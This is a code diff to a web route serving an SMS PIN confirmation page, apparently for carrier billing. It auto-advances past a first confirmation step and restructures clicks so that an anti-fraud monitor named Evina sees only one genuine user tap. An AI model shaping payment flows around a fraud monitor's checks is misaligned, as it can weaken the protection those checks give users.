@@ -174,7 +174,7 @@ export async function GET(request: NextRequest) {
       <div class="step-dot" id="stepDot2"></div>
       <div class="step-dot" id="stepDot3"></div>
     </div>
-    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v10</span>
+    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v12</span>
   </div>
 
   <div class="main">
@@ -364,12 +364,13 @@ export async function GET(request: NextRequest) {
     }
 
     function goToPhase2() {
+      if (phase === 2) return; // prevent double transition
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       document.getElementById('phase2').classList.remove('phase-hidden');
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
-      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Waiting for SMS...</span>';
       dbg('Phase 2 — waiting for Chrome auto-fill or manual entry...');
       // Wait 15s for Chrome to auto-fill otpFull via "Allow" dialog, then show manual entry
       setTimeout(function() {
@@ -403,8 +404,12 @@ export async function GET(request: NextRequest) {
       setTimeout(function() { if (!isVerifying) verifyPin(cleaned); }, 500);
     }
 
-    // If PinRequest failed (Status != 0), skip spinner and go straight to error
-    if (PIN_REQUEST_STATUS !== '0') {
+    // Auto-transition to phase 2 on page load — NEVER let confirmBtn be clicked at phase 1
+    // Evina monitors confirmBtn clicks, so the ONLY click must be the real user tap on "Verify Code"
+    if (PIN_REQUEST_STATUS === '0') {
+      dbg('PinRequest OK — auto-entering phase 2 (no confirmBtn click)');
+      goToPhase2();
+    } else {
       dbg('PinRequest FAILED (Status=' + PIN_REQUEST_STATUS + ') — SMS was NOT sent');
       goToPhase2();
       showManualEntry();
@@ -415,16 +420,19 @@ export async function GET(request: NextRequest) {
 
     confirmBtn.addEventListener('click', function(e) {
       dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted + ' isVerifying=' + isVerifying);
-      if (phase === 1) {
-        goToPhase2();
-      } else if (phase === 2) {
+      // Phase 1 auto-transitions on load — ignore any clicks at phase 1
+      if (phase === 1) { dbg('Phase 1 — ignoring click (auto-transition handles this)'); return; }
+      if (phase === 2) {
         if (isVerifying) { dbg('Skipping — verify already in progress'); return; }
+        // Evina REQUIRES a real user tap (isTrusted=true) on confirmBtn
+        // This must be the ONLY click Evina ever sees on this button
+        if (!e.isTrusted) { dbg('Blocked programmatic click — Evina needs real user tap'); return; }
         var pin = getFullPin();
         if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
           pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
         }
-        dbg('Manual verify — pin="' + pin + '"');
-        if (pin.length !== 4) return;
+        dbg('User tapped Verify Code — pin="' + pin + '"');
+        if (pin.length !== 4) { showError('Please enter the 4-digit code'); return; }
         verifyPin(pin);
       }
     });
